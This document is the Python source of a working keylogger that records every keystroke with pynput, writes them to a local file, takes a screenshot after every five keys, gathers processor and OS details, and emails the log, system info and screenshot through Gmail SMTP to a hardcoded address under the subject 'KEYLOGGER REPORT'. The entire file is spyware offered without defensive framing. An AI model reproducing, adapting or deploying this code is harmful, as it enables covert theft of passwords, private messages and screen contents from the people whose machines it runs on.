from pynput.keyboard import Key, Listener
from datetime import datetime
import pyscreenshot as ImageGrab
from json import dumps
from secret import EMAIL, PASSWORD
from threading import Thread
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import smtplib
import platform
import time
import os

count = 0
keys = []  

class Keylogger () :
    def file (self) :
        with open('keystrokes.txt', 'a') as f:
            f.write("TimeStamp"+(str(datetime.now()))[:-7]+":\n")
            f.write("\n")

        def on_press(key):
            global count, keys
            keys.append(key)
            count += 1
            if count >= 5:
                count = 0
                write_file(keys)
                keys = []

        def on_release(key):
            if key == Key.esc:
                return False

        def write_file(keys):
            with open("keystrokes.txt", "a") as f:
                for idx, key in enumerate(keys):
                    k = str(key).replace("'", "")
                    if k.find("space") > 0 and k.find("backspace") == -1:
                        f.write("\n")
                    elif k.find("Key") == -1:
                        f.write(k)
            screenshot_name = self.screenshot()
            self.send_mail(extras = screenshot_name)

        with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
            listener.join()

    def screenshot (self) :
        screenShot = ImageGrab.grab()
        name = str("%.2f"%time.time())+ "sec.png"
        screenShot.save(name)
        return name


    def systeminfo (self) :
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        data = {
            "platform": plat,
            "system": system,
            "machine": machine
        }
        return dumps(data)

    def send_mail(self, extras):
        msg = MIMEMultipart()
        content = ''
        try :
            with open('keystrokes.txt', 'r') as f :
                content += f.read()
        except :
            print("file not found")
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        def getFile (file_name) :
            with open(file_name, 'rb') as f :
                return f.read()
        msg['Subject'] = 'KEYLOGGER REPORT'
        msg['From'] = 'h0rcruxx10@gmail.com'
        msg['To'] = 'h0rcruxx10@gmail.com'
        text = MIMEText(content)
        systeminfo = MIMEText(self.systeminfo())
        msg.attach(systeminfo)
        msg.attach(text)
        img_data = getFile(extras)
        image = MIMEImage(img_data, name=os.path.basename(extras))
        msg.attach(image)
        server.sendmail(EMAIL, EMAIL, msg.as_string())
        server.quit()
        print('Mail sent')

    def run (self) :
        self.file()

if __name__ == "__main__":
    k = Keylogger()
    k.run()
